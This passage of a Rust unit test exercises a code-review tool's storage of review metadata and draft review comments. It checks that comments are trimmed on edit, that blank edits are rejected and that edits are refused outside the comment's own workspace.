        assert!(review_info(&st, "theirs").unwrap_err().contains("lost its details"));
        st.db().set_setting(&review_key("theirs"), &json!({"number": 7, "head_sha": "abc", "merge_base": "def"}).to_string()).unwrap();
        assert_eq!(review_info(&st, "theirs").unwrap().1["head_sha"], "abc");

        // Drafts from findings can be edited before they are posted.
        st.db().add_review_comments("theirs", &[store::ReviewComment { id: "f1".into(), file: "a.ts".into(), side: "new".into(), line: 3, end_line: 3, code: String::new(), text: "Off by one.".into() }]).unwrap();
        st.db().update_review_comment("theirs", "f1", "  Off by one at the end.  ").unwrap();
        assert_eq!(st.db().review_comments("theirs").unwrap()[0].text, "Off by one at the end.");
        assert!(st.db().update_review_comment("theirs", "f1", " ").is_err());
        assert!(st.db().update_review_comment("mine", "f1", "x").is_err(), "only in its own workspace");
    }
}
